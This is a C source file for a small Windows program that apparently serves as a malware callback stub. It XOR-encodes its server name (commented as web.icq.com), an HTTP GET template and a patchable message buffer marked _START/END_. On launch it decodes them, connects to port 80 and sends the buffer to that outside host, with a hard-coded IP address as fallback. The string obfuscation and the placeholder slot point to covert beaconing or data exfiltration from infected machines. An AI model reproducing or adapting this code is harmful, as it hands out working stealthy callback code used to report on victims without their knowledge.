
#include <windows.H>
#include <winsock.h>
#include <stdio.h>

#define XORCHAR 0xAB
#define DATA_LEN 256
#define HTTP_PORT 80
#define XOR(x,y) while(y--){ x[y] ^= (XORCHAR +y);  }

#define WWP_SERVER 16777343

#define RESOLVE_SERVER

#ifdef RESOLVE_SERVER
	//char server[12] = "web.icq.com\0";
	BYTE server[12] = {-36,-55,-49,-128,-58,-45,-64,-100,-48,-37,-40,-74};
	//char server[] = "localhost";
#endif

DWORD TCPSend(SOCKET s,const char *buffer,UINT count);

char msg[DATA_LEN] = "_START\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\
\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\
\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\
\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe\xfe END_";


#define REQUEST_LEN 30
BYTE request[REQUEST_LEN] = {236,233,249,142,138,195,145,250,231,224,229,153,134,150,136,183,177,244,242,237,235,250,225,231,176,201,207,203,205,200};
//"GET %s HTTP/1.1\r\nHOST: %s\r\n\r\n\0";

int PASCAL WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR pszCmdLine, int nCmdShow)
{
	DWORD counter = DATA_LEN;
	SOCKET s = INVALID_SOCKET;
	WORD WS_Version = MAKEWORD(2,0);
	WSADATA WS_Data;
	SOCKADDR_IN Destination;
	char buf[512];

#ifdef RESOLVE_SERVER
	LPHOSTENT HEnt;
#endif

	counter = REQUEST_LEN;
	XOR (request,counter)
	counter = DATA_LEN;
	XOR (msg,counter)
	counter = 12;
	XOR (server,counter)

	if(WSAStartup(WS_Version,&WS_Data)) exit(1); /* Quit, as winsock didnt startup */

	if ((s = socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET) exit(1);

	Destination.sin_family=AF_INET;
	Destination.sin_port = htons(HTTP_PORT);

#ifdef RESOLVE_SERVER
	if (!(HEnt = gethostbyname(server)))
		Destination.sin_addr.S_un.S_addr = WWP_SERVER;
	else
		Destination.sin_addr = *((LPIN_ADDR)*HEnt->h_addr_list);
#else
	Destination.sin_addr.S_un.S_addr = WWP_SERVER;
#endif

	if(connect(s,(LPSOCKADDR)&Destination,sizeof(SOCKADDR_IN))) exit(1);

	TCPSend(s,buf,sprintf(buf,request,msg,server));

	recv(s,buf,512,0);

	return 0;
}

DWORD TCPSend(SOCKET s,const char *buffer,UINT count)
{
	int ret;
	TIMEVAL tm;
	fd_set wfds;
	FD_ZERO(&wfds);
	FD_SET(s,&wfds);
	tm.tv_sec=5;
	tm.tv_usec=0;
	if((ret=select(0,NULL,&wfds,NULL,&tm))>0) {
		do {
			ret=send(s,buffer,count,0);
			if(ret==SOCKET_ERROR) break;

			count-=ret;
			buffer+=ret;
			if(count>0) Sleep(20);
		} while(count>0);
		if(ret==SOCKET_ERROR)
			return -1;
		return 1;
	}
	return ret;
}

